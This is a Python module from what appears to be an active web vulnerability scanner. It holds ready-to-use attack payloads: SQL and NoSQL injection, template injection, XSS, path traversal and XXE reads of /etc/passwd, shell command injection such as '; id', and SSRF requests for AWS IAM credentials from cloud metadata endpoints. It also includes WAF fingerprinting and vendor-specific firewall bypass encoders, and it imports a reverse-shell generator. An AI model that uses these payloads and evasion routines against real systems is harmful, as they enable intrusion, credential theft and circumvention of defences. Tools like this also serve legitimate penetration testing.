"""Active scanner module for real target reconnaissance and vulnerability testing."""
from __future__ import annotations

import hashlib
import json
import re
import ssl
import urllib.parse
import warnings
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any

# Suppress SSL warnings for targets with self-signed certs
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Use urllib for zero dependencies, but prefer requests if available
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    import urllib.request
    import urllib.error

# MISP Warning List Filter for false positive reduction
try:
    import sys
    sys.path.insert(0, str(__file__).rsplit("src", 1)[0] + "tools")
    from warning_list_filter import MISPWarningListFilter, WarningMatch
    HAS_WARNING_FILTER = True
except ImportError:
    HAS_WARNING_FILTER = False
    MISPWarningListFilter = None
    WarningMatch = None

# Dynamic Payload Engine for comprehensive payload generation
try:
    from attack_surface.dynamic_payloads import (
        DynamicPayloadEngine,
        PayloadContext,
        PayloadMode,
        create_engine as create_payload_engine,
        WAFBypassEngine,
        EncodingEngine,
        ObfuscationEngine,
    )
    HAS_DYNAMIC_PAYLOADS = True
except ImportError:
    HAS_DYNAMIC_PAYLOADS = False
    DynamicPayloadEngine = None
    PayloadMode = None
    create_payload_engine = None

# OOB Server for blind vulnerability detection
try:
    from attack_surface.oob_server import (
        OOBServer,
        OOBCallback,
        BlindInjectionDetector,
        DNSExfiltrationDetector,
    )
    HAS_OOB_SERVER = True
except ImportError:
    HAS_OOB_SERVER = False
    OOBServer = None
    BlindInjectionDetector = None

# Nmap Arsenal for network reconnaissance
try:
    import sys
    from pathlib import Path
    tools_path = Path(__file__).parent.parent.parent / "tools"
    if tools_path.exists():
        sys.path.insert(0, str(tools_path))
    from nmap_arsenal import NmapArsenal, ScanType, NSECategory
    HAS_NMAP_ARSENAL = True
except ImportError:
    HAS_NMAP_ARSENAL = False
    NmapArsenal = None
    ScanType = None

# Reverse shells for RCE exploitation
try:
    from reverse_shells import generate_payloads as generate_reverse_shells
    HAS_REVERSE_SHELLS = True
except ImportError:
    HAS_REVERSE_SHELLS = False
    generate_reverse_shells = None

# ProjectDiscovery tools integration (nuclei, subfinder, httpx, etc.)
try:
    from attack_surface.pdtools import (
        ProjectDiscoveryTools,
        PDToolResult,
        SubdomainResult,
        PortResult,
        HttpProbeResult,
        CrawlResult,
        NucleiResult,
        CVEResult,
        get_pd_tools,
    )
    HAS_PD_TOOLS = True
except ImportError:
    HAS_PD_TOOLS = False
    ProjectDiscoveryTools = None
    get_pd_tools = None


@dataclass
class HttpResponse:
    """Captured HTTP response."""
    status_code: int
    headers: dict[str, str]
    body: str
    elapsed_ms: float
    error: str = ""


@dataclass
class EndpointInfo:
    """Discovered endpoint information."""
    url: str
    method: str
    parameters: list[str] = field(default_factory=list)
    content_type: str = ""
    requires_auth: bool = False


@dataclass
class TechStack:
    """Detected technology stack."""
    server: str = ""
    framework: str = ""
    language: str = ""
    database: str = ""
    headers: dict[str, str] = field(default_factory=dict)
    cookies: list[str] = field(default_factory=list)


@dataclass
class VulnTestResult:
    """Result of a vulnerability test."""
    vuln_type: str
    payload: str
    target_url: str
    request_data: str
    response: HttpResponse
    is_vulnerable: bool
    confidence: float
    evidence: str
    evidence_hash: str = ""


@dataclass 
class ScanResult:
    """Complete scan result for a target."""
    target: str
    timestamp: str
    tech_stack: TechStack
    endpoints: list[EndpointInfo]
    vulnerabilities: list[VulnTestResult]
    raw_responses: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class BaselineResponse:
    """Baseline response for comparison."""
    status_code: int
    body_length: int
    body_hash: str
    has_token: bool
    has_user_data: bool
    is_login_page: bool
    content_type: str


@dataclass
class InteractivePayload:
    """Interactive payload with unique canary for validation."""
    payload: str
    canary: str
    validation_type: str  # "canary", "time", "math", "error", "oob"
    expected_result: str
    timeout_threshold_ms: float = 0.0  # For time-based


class InteractiveValidator:
    """
    Interactive payload validation system.
    
    Uses unique canary values and interactive techniques to confirm
    true positives and eliminate false positives.
    
    Validation types:
    - canary: Unique random string that must appear in response
    - time: Time-based delay verification
    - math: Mathematical expression that evaluates to expected result
    - error: Specific error message pattern
    - reflect: Payload reflected in response (for XSS)
    - oob: Out-of-band callback (DNS/HTTP)
    """
    
    @staticmethod
    def generate_canary(prefix: str = "ASF") -> str:
        """Generate unique canary value for payload tracking."""
        import uuid
        import random
        # Format: ASF_<random_hex>_<checksum>
        rand_part = uuid.uuid4().hex[:12]
        checksum = hex(sum(ord(c) for c in rand_part) % 256)[2:].zfill(2)
        return f"{prefix}_{rand_part}_{checksum}"
    
    @staticmethod
    def generate_math_canary() -> tuple[str, str]:
        """Generate math expression and expected result."""
        import random
        a = random.randint(1000, 9999)
        b = random.randint(100, 999)
        # Use multiplication - result is unique enough
        return f"{a}*{b}", str(a * b)
    
    @staticmethod
    def get_sqli_payloads() -> list[InteractivePayload]:
        """Generate SQL injection payloads with interactive validation."""
        canary = InteractiveValidator.generate_canary("SQLI")
        math_expr, math_result = InteractiveValidator.generate_math_canary()
        
        return [
            # Time-based blind SQLi - most reliable
            InteractivePayload(
                payload="1'; WAITFOR DELAY '0:0:5'--",
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            InteractivePayload(
                payload="1' AND SLEEP(5)#",
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            InteractivePayload(
                payload="1' AND (SELECT SLEEP(5))--",
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            InteractivePayload(
                payload="1'; SELECT pg_sleep(5)--",
                canary="",
                validation_type="time",
                expected_result="5000ms delay (PostgreSQL)",
                timeout_threshold_ms=4500
            ),
            # Union-based with canary
            InteractivePayload(
                payload=f"' UNION SELECT '{canary}',NULL,NULL--",
                canary=canary,
                validation_type="canary",
                expected_result=f"Canary {canary} in response"
            ),
            InteractivePayload(
                payload=f"' UNION SELECT 1,'{canary}',3--",
                canary=canary,
                validation_type="canary",
                expected_result=f"Canary {canary} in response"
            ),
            # Error-based - specific errors
            InteractivePayload(
                payload="'",
                canary="",
                validation_type="error",
                expected_result="sql syntax|mysql|postgresql|oracle|sqlite"
            ),
            InteractivePayload(
                payload="1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                canary="",
                validation_type="error",
                expected_result="XPATH syntax|extractvalue|version"
            ),
            # Boolean-based with math
            InteractivePayload(
                payload=f"1' AND 1=1 UNION SELECT {math_expr}--",
                canary=math_result,
                validation_type="math",
                expected_result=f"Math result {math_result} in response"
            ),
        ]
    
    @staticmethod
    def get_nosql_payloads() -> list[InteractivePayload]:
        """Generate NoSQL injection payloads with interactive validation."""
        canary = InteractiveValidator.generate_canary("NOSQL")
        
        return [
            # MongoDB operator injection
            InteractivePayload(
                payload='{"$gt": ""}',
                canary="",
                validation_type="auth_bypass",
                expected_result="200 with token/session data"
            ),
            InteractivePayload(
                payload='{"$ne": null}',
                canary="",
                validation_type="auth_bypass", 
                expected_result="200 with token/session data"
            ),
            InteractivePayload(
                payload='{"$regex": ".*"}',
                canary="",
                validation_type="auth_bypass",
                expected_result="200 with token/session data"
            ),
            # Time-based using $where
            InteractivePayload(
                payload='{"$where": "sleep(5000)"}',
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            InteractivePayload(
                payload='{"$where": "function(){sleep(5000);return true;}"}',
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            # Error-based
            InteractivePayload(
                payload='{"$where": "invalid.syntax("}',
                canary="",
                validation_type="error",
                expected_result="SyntaxError|MongoError|BSON"
            ),
        ]
    
    @staticmethod
    def get_ssti_payloads() -> list[InteractivePayload]:
        """Generate SSTI payloads with math-based validation."""
        math_a, math_b = 7919, 7927  # Prime numbers for unique result
        expected = str(math_a * math_b)  # 62769713
        
        return [
            # Jinja2/Twig - double curly braces
            InteractivePayload(
                payload=f"{{{{  {math_a}*{math_b}  }}}}",
                canary=expected,
                validation_type="math",
                expected_result=f"Math result {expected}"
            ),
            # Freemarker/Velocity - dollar curly
            InteractivePayload(
                payload=f"${{{math_a}*{math_b}}}",
                canary=expected,
                validation_type="math",
                expected_result=f"Math result {expected}"
            ),
            # Mako
            InteractivePayload(
                payload=f"${{{math_a}*{math_b}}}",
                canary=expected,
                validation_type="math",
                expected_result=f"Math result {expected}"
            ),
            # ERB (Ruby)
            InteractivePayload(
                payload=f"<%= {math_a}*{math_b} %>",
                canary=expected,
                validation_type="math",
                expected_result=f"Math result {expected}"
            ),
            # Smarty
            InteractivePayload(
                payload=f"{{{math_a}*{math_b}}}",
                canary=expected,
                validation_type="math",
                expected_result=f"Math result {expected}"
            ),
            # Pebble
            InteractivePayload(
                payload=f"{{{{ {math_a}*{math_b} }}}}",
                canary=expected,
                validation_type="math",
                expected_result=f"Math result {expected}"
            ),
        ]
    
    @staticmethod
    def get_xss_payloads() -> list[InteractivePayload]:
        """Generate XSS payloads with canary-based validation."""
        canary = InteractiveValidator.generate_canary("XSS")
        
        return [
            # Basic script tag with canary
            InteractivePayload(
                payload=f"<script>alert('{canary}')</script>",
                canary=canary,
                validation_type="reflect",
                expected_result=f"Payload with {canary} reflected unencoded"
            ),
            # Event handler with canary
            InteractivePayload(
                payload=f"<img src=x onerror=alert('{canary}')>",
                canary=canary,
                validation_type="reflect",
                expected_result=f"Payload with {canary} reflected"
            ),
            # SVG with canary
            InteractivePayload(
                payload=f"<svg onload=alert('{canary}')>",
                canary=canary,
                validation_type="reflect",
                expected_result=f"SVG payload with {canary} reflected"
            ),
            # Attribute escape with canary
            InteractivePayload(
                payload=f"' onmouseover='alert(`{canary}`)' data-x='",
                canary=canary,
                validation_type="reflect",
                expected_result=f"Event handler with {canary} reflected"
            ),
            # DOM-based with canary
            InteractivePayload(
                payload=f"javascript:alert('{canary}')",
                canary=canary,
                validation_type="reflect",
                expected_result=f"JavaScript URI with {canary} reflected"
            ),
        ]
    
    @staticmethod
    def get_lfi_payloads() -> list[InteractivePayload]:
        """Generate LFI payloads with content validation."""
        return [
            # Linux passwd file - known content
            InteractivePayload(
                payload="../../../etc/passwd",
                canary="root:x:0:0",
                validation_type="canary",
                expected_result="Linux passwd content"
            ),
            InteractivePayload(
                payload="....//....//....//etc/passwd",
                canary="root:x:0:0",
                validation_type="canary",
                expected_result="Linux passwd content (filter bypass)"
            ),
            InteractivePayload(
                payload="..%2f..%2f..%2fetc/passwd",
                canary="root:x:0:0",
                validation_type="canary",
                expected_result="Linux passwd content (URL encoded)"
            ),
            InteractivePayload(
                payload="php://filter/convert.base64-encode/resource=/etc/passwd",
                canary="cm9vdDp4OjA6",  # base64 of "root:x:0:"
                validation_type="canary",
                expected_result="Base64 encoded passwd"
            ),
            # Windows
            InteractivePayload(
                payload="..\\..\\..\\windows\\win.ini",
                canary="[fonts]",
                validation_type="canary",
                expected_result="Windows win.ini content"
            ),
            InteractivePayload(
                payload="C:\\Windows\\System32\\drivers\\etc\\hosts",
                canary="localhost",
                validation_type="canary",
                expected_result="Windows hosts file"
            ),
        ]
    
    @staticmethod
    def get_rce_payloads() -> list[InteractivePayload]:
        """Generate RCE payloads with interactive validation."""
        canary = InteractiveValidator.generate_canary("RCE")
        
        return [
            # Time-based - most reliable for blind RCE
            InteractivePayload(
                payload="; sleep 5",
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            InteractivePayload(
                payload="| sleep 5",
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            InteractivePayload(
                payload="$(sleep 5)",
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            InteractivePayload(
                payload="`sleep 5`",
                canary="",
                validation_type="time",
                expected_result="5000ms delay",
                timeout_threshold_ms=4500
            ),
            # Windows time-based
            InteractivePayload(
                payload="& ping -n 6 127.0.0.1",
                canary="",
                validation_type="time",
                expected_result="5000ms delay (Windows ping)",
                timeout_threshold_ms=4500
            ),
            # Echo canary - confirms execution
            InteractivePayload(
                payload=f"; echo {canary}",
                canary=canary,
                validation_type="canary",
                expected_result=f"Canary {canary} in response"
            ),
            InteractivePayload(
                payload=f"| echo {canary}",
                canary=canary,
                validation_type="canary",
                expected_result=f"Canary {canary} in response"
            ),
            # Known output
            InteractivePayload(
                payload="; id",
                canary="uid=",
                validation_type="canary",
                expected_result="id command output"
            ),
            InteractivePayload(
                payload="| whoami",
                canary="",
                validation_type="error",  # Will contain username
                expected_result="Username in response"
            ),
        ]
    
    @staticmethod
    def get_xxe_payloads() -> list[InteractivePayload]:
        """Generate XXE payloads with content validation."""
        canary = InteractiveValidator.generate_canary("XXE")
        
        return [
            # File read - Linux
            InteractivePayload(
                payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                canary="root:x:0:0",
                validation_type="canary",
                expected_result="Linux passwd via XXE"
            ),
            # File read - Windows
            InteractivePayload(
                payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                canary="[fonts]",
                validation_type="canary",
                expected_result="Windows win.ini via XXE"
            ),
            # Error-based XXE
            InteractivePayload(
                payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent">%xxe;]><foo>test</foo>',
                canary="",
                validation_type="error",
                expected_result="failed to load|no such file|entity"
            ),
            # Parameter entity
            InteractivePayload(
                payload=f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "{canary}">]><foo>&xxe;</foo>',
                canary=canary,
                validation_type="canary",
                expected_result=f"Canary {canary} via entity expansion"
            ),
        ]
    
    @staticmethod
    def get_ssrf_payloads() -> list[InteractivePayload]:
        """Generate SSRF payloads with content validation."""
        return [
            # AWS metadata
            InteractivePayload(
                payload="http://169.254.169.254/latest/meta-data/",
                canary="ami-id",
                validation_type="canary",
                expected_result="AWS metadata access"
            ),
            InteractivePayload(
                payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                canary="AccessKeyId",
                validation_type="canary",
                expected_result="AWS IAM credentials"
            ),
            # GCP metadata
            InteractivePayload(
                payload="http://metadata.google.internal/computeMetadata/v1/",
                canary="attributes",
                validation_type="canary",
                expected_result="GCP metadata access"
            ),
            # Azure metadata
            InteractivePayload(
                payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                canary="compute",
                validation_type="canary",
                expected_result="Azure metadata access"
            ),
            # Local file via file://
            InteractivePayload(
                payload="file:///etc/passwd",
                canary="root:x:0:0",
                validation_type="canary",
                expected_result="Local file read via SSRF"
            ),
            # Internal service
            InteractivePayload(
                payload="http://127.0.0.1:6379/",
                canary="redis",
                validation_type="canary",
                expected_result="Internal Redis access"
            ),
            InteractivePayload(
                payload="http://localhost:9200/",
                canary="elasticsearch",
                validation_type="canary",
                expected_result="Internal Elasticsearch access"
            ),
        ]
    
    @staticmethod
    def validate_response(
        payload: InteractivePayload, 
        response_body: str, 
        response_time_ms: float,
        response_status: int
    ) -> tuple[bool, float, str]:
        """
        Validate if payload was successful based on validation type.
        
        Returns:
            Tuple of (is_vulnerable, confidence, evidence)
        """
        body_lower = response_body.lower()
        
        if payload.validation_type == "canary":
            # Check if canary appears in response
            if payload.canary and payload.canary in response_body:
                return True, 0.95, f"Canary '{payload.canary[:30]}...' found in response"
            return False, 0.1, "Canary not found in response"
        
        elif payload.validation_type == "time":
            # Check if response time exceeds threshold
            if response_time_ms >= payload.timeout_threshold_ms:
                return True, 0.90, f"Time-based confirmed: {response_time_ms:.0f}ms (threshold: {payload.timeout_threshold_ms}ms)"
            return False, 0.1, f"Response time {response_time_ms:.0f}ms below threshold"
        
        elif payload.validation_type == "math":
            # Check if math result appears in response
            if payload.canary and payload.canary in response_body:
                return True, 0.95, f"Math result '{payload.canary}' found - template executed"
            return False, 0.1, f"Math result '{payload.canary}' not found"
        
        elif payload.validation_type == "error":
            # Check for specific error patterns
            error_patterns = payload.expected_result.lower().split("|")
            for pattern in error_patterns:
                if pattern.strip() in body_lower:
                    return True, 0.85, f"Error pattern '{pattern}' found in response"
            return False, 0.1, "Expected error pattern not found"
        
        elif payload.validation_type == "reflect":
            # Check if payload is reflected (for XSS)
            # Must check that it's reflected without encoding
            if payload.canary in response_body:
                # Check if it's in HTML context unencoded
                if f"'{payload.canary}'" in response_body or f'"{payload.canary}"' in response_body:
                    return True, 0.90, f"XSS payload with canary reflected unencoded"
                # Check for event handler context
                if "onerror" in response_body or "onload" in response_body or "onmouseover" in response_body:
                    if payload.canary in response_body:
                        return True, 0.85, f"Event handler with canary reflected"
            return False, 0.1, "Payload not reflected or encoded"
        
        elif payload.validation_type == "auth_bypass":
            # Check for successful authentication indicators
            if response_status == 200:
                auth_indicators = ["token", "jwt", "session", "access_token", "refresh_token", 
                                   "user_id", "username", "email", "role", "admin"]
                for indicator in auth_indicators:
                    if indicator in body_lower:
                        return True, 0.90, f"Auth bypass: '{indicator}' in 200 response"
            return False, 0.1, f"No auth bypass indicators. Status: {response_status}"
        
        return False, 0.0, "Unknown validation type"


# =============================================================================
# WAF Detection and Bypass Module
# Based on https://github.com/SecH0us3/waf-checker
# =============================================================================

@dataclass
class WAFSignature:
    """WAF detection signature."""
    name: str
    headers: dict[str, str | re.Pattern]
    status_codes: list[int] = field(default_factory=list)
    body_patterns: list[re.Pattern] = field(default_factory=list)
    cookie_patterns: list[re.Pattern] = field(default_factory=list)


@dataclass
class WAFDetectionResult:
    """Result of WAF detection."""
    detected: bool
    waf_type: str
    confidence: float
    evidence: list[str]
    bypass_techniques: list[str]
    captcha_detected: str = ""


class PayloadEncoder:
    """
    Encoding and obfuscation utilities for WAF bypass techniques.
    Based on PortSwigger, OWASP, and security community research.
    """
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode payload. Example: ' -> %27 -> %2527"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode special characters. Example: ' -> \\u0027"""
        result = ""
        for char in payload:
            if char in "\"'<>&=":
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result
    
    @staticmethod
    def html_entity_encode(payload: str, use_hex: bool = False) -> str:
        """HTML entity encode special characters."""
        entity_map = {
            '"': '&#x22;' if use_hex else '&#34;',
            "'": '&#x27;' if use_hex else '&#39;',
            '<': '&#x3C;' if use_hex else '&#60;',
            '>': '&#x3E;' if use_hex else '&#62;',
            '&': '&#x26;' if use_hex else '&#38;',
            '=': '&#x3D;' if use_hex else '&#61;',
            ' ': '&#x20;' if use_hex else '&#32;',
        }
        result = ""
        for char in payload:
            result += entity_map.get(char, char)
        return result
    
    @staticmethod
    def mixed_case_encode(payload: str) -> str:
        """Mixed case encoding for keywords. Example: UNION -> uNiOn"""
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE',
                    'DROP', 'CREATE', 'ALTER', 'EXEC', 'EXECUTE', 'SCRIPT', 'ALERT',
                    'JAVASCRIPT', 'VBSCRIPT', 'ONLOAD', 'ONERROR', 'ONCLICK', 'AND', 'OR']
        
        result = payload
        for keyword in keywords:
            mixed = ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(keyword))
            result = re.sub(keyword, mixed, result, flags=re.IGNORECASE)
        return result
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode characters. Example: ' -> 0x27"""
        result = ""
        for char in payload:
            if char in "\"'<>&":
                result += f"0x{ord(char):02x}"
            else:
                result += char
        return result
    
    @staticmethod
    def comment_obfuscate(payload: str) -> str:
        """SQL comment-based obfuscation. Replace spaces with /**/"""
        return payload.replace(' ', '/**/')
    
    @staticmethod
    def tab_obfuscate(payload: str) -> str:
        """Replace spaces with tabs (%09)."""
        return payload.replace(' ', '%09')
    
    @staticmethod
    def newline_obfuscate(payload: str) -> str:
        """Replace spaces with newlines (%0A)."""
        return payload.replace(' ', '%0A')
    
    @staticmethod
    def sql_obfuscation(payload: str) -> list[str]:
        """Generate SQL-specific obfuscation variations."""
        variations = [payload]
        
        # Comment-based obfuscation
        variations.append(payload.replace(' ', '/**/'))
        variations.append(payload.replace(' ', '/*comment*/'))
        
        # Space alternatives
        variations.append(payload.replace(' ', '+'))
        variations.append(payload.replace(' ', '%09'))  # Tab
        variations.append(payload.replace(' ', '%0A'))  # LF
        variations.append(payload.replace(' ', '%0D'))  # CR
        
        # Keyword obfuscation
        if 'SELECT' in payload.upper():
            variations.append(re.sub(r'SELECT', 'SEL/**/ECT', payload, flags=re.IGNORECASE))
            variations.append(re.sub(r'SELECT', 'SE/**/LECT', payload, flags=re.IGNORECASE))
        if 'UNION' in payload.upper():
            variations.append(re.sub(r'UNION', 'UNI/**/ON', payload, flags=re.IGNORECASE))
            variations.append(re.sub(r'UNION', 'UN/**/ION', payload, flags=re.IGNORECASE))
        
        return list(set(variations))
    
    @staticmethod
    def xss_obfuscation(payload: str) -> list[str]:
        """Generate XSS-specific obfuscation variations."""
        variations = [payload]
        
        # Case variations
        variations.append(payload.lower())
        variations.append(payload.upper())
        
        # Script tag variations
        if '<script>' in payload.lower():
            variations.append(re.sub(r'<script>', '<SCRIPT>', payload, flags=re.IGNORECASE))
            variations.append(re.sub(r'<script>', '<ScRiPt>', payload, flags=re.IGNORECASE))
            variations.append(re.sub(r'<script>', '<script \\>', payload, flags=re.IGNORECASE))
        
        # JavaScript protocol variations
        if 'javascript:' in payload.lower():
            variations.append(re.sub(r'javascript:', 'JAVASCRIPT:', payload, flags=re.IGNORECASE))
            variations.append(re.sub(r'javascript:', 'JaVaScRiPt:', payload, flags=re.IGNORECASE))
        
        return list(set(variations))
    
    @staticmethod
    def generate_bypass_variations(payload: str, attack_type: str = "generic") -> list[str]:
        """Generate comprehensive bypass variations for any payload."""
        variations = [payload]
        
        # Basic encodings
        variations.append(PayloadEncoder.double_url_encode(payload))
        variations.append(PayloadEncoder.unicode_encode(payload))
        variations.append(PayloadEncoder.html_entity_encode(payload, use_hex=False))
        variations.append(PayloadEncoder.html_entity_encode(payload, use_hex=True))
        variations.append(PayloadEncoder.mixed_case_encode(payload))
        variations.append(PayloadEncoder.hex_encode(payload))
        variations.append(urllib.parse.quote(payload, safe=''))
        
        # Attack-specific obfuscation
        if 'sql' in attack_type.lower():
            variations.extend(PayloadEncoder.sql_obfuscation(payload))
        elif 'xss' in attack_type.lower():
            variations.extend(PayloadEncoder.xss_obfuscation(payload))
        
        return list(set(variations))


class WAFBypasses:
    """WAF-specific bypass utilities."""
    
    @staticmethod
    def cloudflare_bypass(payload: str) -> list[str]:
        """Cloudflare-specific bypasses."""
        bypasses = [payload]
        
        # Unicode encoding for special chars
        bypasses.append(payload.replace("'", "\\u0027"))
        bypasses.append(payload.replace('"', "\\u0022"))
        bypasses.append(payload.replace('<', "\\u003c"))
        bypasses.append(payload.replace('>', "\\u003e"))
        
        # Alternative space characters
        bypasses.append(payload.replace(' ', '\\u00A0'))  # Non-breaking space
        bypasses.append(payload.replace(' ', '\\u2000'))  # En quad
        
        # Unicode quote variations
        bypasses.append(payload.replace("'", "\uFF07"))
        bypasses.append(payload.replace('"', "\uFF02"))
        
        # Prototype pollution bypasses
        if '__proto__' in payload.lower():
            bypasses.append(re.sub(r'__proto__', '__pr\\u006f\\u0074o__', payload, flags=re.IGNORECASE))
            bypasses.append(re.sub(r'__proto__', '__pro__proto__to__', payload, flags=re.IGNORECASE))
        
        return list(set(bypasses))
    
    @staticmethod
    def aws_waf_bypass(payload: str) -> list[str]:
        """AWS WAF-specific bypasses."""
        bypasses = [payload]
        
        # Character set bypasses
        bypasses.append(payload.replace('=', '\\u003D'))
        bypasses.append(payload.replace('&', '\\u0026'))
        
        # Unicode normalization
        try:
            import unicodedata
            bypasses.append(unicodedata.normalize('NFD', payload))
            bypasses.append(unicodedata.normalize('NFKD', payload))
            bypasses.append(unicodedata.normalize('NFKC', payload))
        except Exception:
            pass
        
        return list(set(bypasses))
    
    @staticmethod
    def modsecurity_bypass(payload: str) -> list[str]:
        """ModSecurity-specific bypasses."""
        bypasses = [payload]
        
        # Comment-based evasions
        bypasses.append(re.sub(r'union', 'uni/**/on', payload, flags=re.IGNORECASE))
        bypasses.append(re.sub(r'select', 'sel/**/ect', payload, flags=re.IGNORECASE))
        bypasses.append(re.sub(r'script', 'scr/**/ipt', payload, flags=re.IGNORECASE))
        
        # Case sensitivity exploits
        bypasses.append(PayloadEncoder.mixed_case_encode(payload))
        
        return list(set(bypasses))
    
    @staticmethod
    def akamai_bypass(payload: str) -> list[str]:
        """Akamai-specific bypasses."""
        bypasses = [payload]
        
        # URL encoding for specific chars
        bypasses.append(payload.replace("'", "%27"))
        bypasses.append(payload.replace('"', "%22"))
        
        # Alternative separators
        bypasses.append(payload.replace(' ', '%09'))  # Tab
        bypasses.append(payload.replace(' ', '%0b'))  # Vertical tab
        bypasses.append(payload.replace(' ', '%0c'))  # Form feed
        
        # Double URL encode special chars
        for char in "\"'<>&":
            bypasses.append(payload.replace(char, urllib.parse.quote(urllib.parse.quote(char, safe=''), safe='')))
        
        return list(set(bypasses))
    
    @staticmethod
    def imperva_bypass(payload: str) -> list[str]:
        """Imperva/Incapsula-specific bypasses."""
        bypasses = [payload]
        
        if '__proto__' in payload.lower():
            bypasses.append(re.sub(r'__proto__', '__pr\\u006f\\u0074o__', payload, flags=re.IGNORECASE))
            bypasses.append(re.sub(r'__proto__', '%5f%5fproto%5f%5f', payload, flags=re.IGNORECASE))
        if 'constructor' in payload.lower():
            bypasses.append(re.sub(r'constructor', 'const\\u0072uctor', payload, flags=re.IGNORECASE))
        
        return list(set(bypasses))
    
    @staticmethod
    def generic_bypass(payload: str) -> list[str]:
        """Generic WAF bypass techniques."""
        bypasses = [payload]
        
        # Double URL encoding
        bypasses.append(PayloadEncoder.double_url_encode(payload))
        
        # Unicode encoding
        bypasses.append(PayloadEncoder.unicode_encode(payload))
        
        # Mixed case
        bypasses.append(PayloadEncoder.mixed_case_encode(payload))
        
        # Comment insertion
        bypasses.append(PayloadEncoder.comment_obfuscate(payload))
        
        # Null byte
        bypasses.append(payload + '%00')
        
        return list(set(bypasses))
    
    @staticmethod
    def get_waf_specific_bypasses(waf_type: str, payload: str) -> list[str]:
        """Get bypass payloads specific to detected WAF type."""
        waf_type_lower = waf_type.lower()
        
        if 'cloudflare' in waf_type_lower:
            return WAFBypasses.cloudflare_bypass(payload)
        elif 'aws' in waf_type_lower:
            return WAFBypasses.aws_waf_bypass(payload)
        elif 'modsecurity' in waf_type_lower:
            return WAFBypasses.modsecurity_bypass(payload)
        elif 'akamai' in waf_type_lower:
            return WAFBypasses.akamai_bypass(payload)
        elif 'imperva' in waf_type_lower or 'incapsula' in waf_type_lower:
            return WAFBypasses.imperva_bypass(payload)
        else:
            return WAFBypasses.generic_bypass(payload)


class WAFDetector:
    """
    WAF Detection and Fingerprinting Module.
    
    Detects Web Application Firewalls based on:
    - Response headers
    - Status codes
    - Body patterns
    - Cookie patterns
    - Timing analysis
    
    Based on https://github.com/SecH0us3/waf-checker
    """
    
    # WAF Signatures - comprehensive list
    WAF_SIGNATURES: list[WAFSignature] = [
        WAFSignature(
            name="Cloudflare",
            headers={
                "server": "cloudflare",
                "cf-ray": "",
                "cf-cache-status": "",
                "cf-mitigated": "",
            },
            status_codes=[403, 429],
            cookie_patterns=[re.compile(r'__cfduid', re.I), re.compile(r'cf_clearance', re.I), 
                           re.compile(r'__cf_bm', re.I)],
            body_patterns=[
                re.compile(r'attention required.*cloudflare', re.I),
                re.compile(r'ray id: [a-f0-9]+-[A-Z]{3}', re.I),
                re.compile(r'Cloudflare Ray ID', re.I),
                re.compile(r'cdn-cgi/challenge-platform', re.I),
                re.compile(r'<title>Just a moment\.\.\.</title>', re.I),
            ],
        ),
        WAFSignature(
            name="AWS WAF",
            headers={
                "x-amzn-errortype": "waf",
                "x-amzn-waf-action": "",
                "x-amzn-requestid": "",
            },
            status_codes=[403],
            cookie_patterns=[re.compile(r'aws-waf-token', re.I)],
            body_patterns=[
                re.compile(r'AWS WAF', re.I),
                re.compile(r'403 ERROR.*The request could not be satisfied', re.I),
                re.compile(r'Request blocked', re.I),
            ],
        ),
        WAFSignature(
            name="Imperva",
            headers={
                "x-iinfo": "",
                "x-cdn": "incapsula",
            },
            status_codes=[403],
            cookie_patterns=[re.compile(r'incap_ses_', re.I), re.compile(r'visid_incap_', re.I),
                           re.compile(r'nlbi_', re.I)],
            body_patterns=[
                re.compile(r'request unsuccessful.*incapsula incident', re.I),
                re.compile(r'Incident ID: [0-9-]+', re.I),
                re.compile(r'Powered By Incapsula', re.I),
            ],
        ),
        WAFSignature(
            name="F5 BIG-IP",
            headers={
                "server": "big-ip",
                "x-wa-info": "",
                "f5-trace-id": "",
            },
            status_codes=[403],
            cookie_patterns=[re.compile(r'TS[0-9a-f]{8}', re.I), re.compile(r'BIGipServer', re.I)],
            body_patterns=[
                re.compile(r'the requested url was rejected', re.I),
                re.compile(r'please consult with your administrator', re.I),
                re.compile(r'your support id is', re.I),
            ],
        ),
        WAFSignature(
            name="ModSecurity",
            headers={
                "server": "mod_security",
                "x-mod-security": "",
            },
            status_codes=[403, 406],
            body_patterns=[
                re.compile(r'Mod_Security', re.I),
                re.compile(r'request blocked by security policy', re.I),
                re.compile(r'OWASP.*CRS', re.I),
            ],
        ),
        WAFSignature(
            name="Akamai",
            headers={
                "server": "akamaighost",
                "akamai-origin-hop": "",
